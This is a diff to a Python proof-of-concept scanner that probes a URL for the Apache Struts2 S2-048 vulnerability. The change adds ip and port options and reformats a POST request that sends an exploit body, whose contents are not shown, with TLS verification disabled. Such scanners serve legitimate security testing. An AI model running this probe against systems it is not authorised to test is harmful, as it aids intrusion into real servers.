@@ -1,11 +1,15 @@
 import warnings
 import requests
 import random
+
 warnings.filterwarnings("ignore")
 
 
-
-def poc(url):
+def poc(url, **kwargs):
+    if kwargs.get('ip'):
+        url = 'http://' + kwargs.get('ip') + ':' + kwargs.get('port')
+    else:
+        url = url
     timeout = 10
     proxies = {'http': '127.0.0.1:9999'}
 
@@ -28,7 +32,7 @@ def poc(url):
         "Content-Type": "application/x-www-form-urlencoded"
     }
     try:
-        req = requests.post(url, data=data_048, headers=headers_048, timeout=timeout, verify=False,)
+        req = requests.post(url, data=data_048, headers=headers_048, timeout=timeout, verify=False, )
         result = "目标存在 Struts2-048, check url: %s" % url
         for c in check:
             if str(c) in req.text:
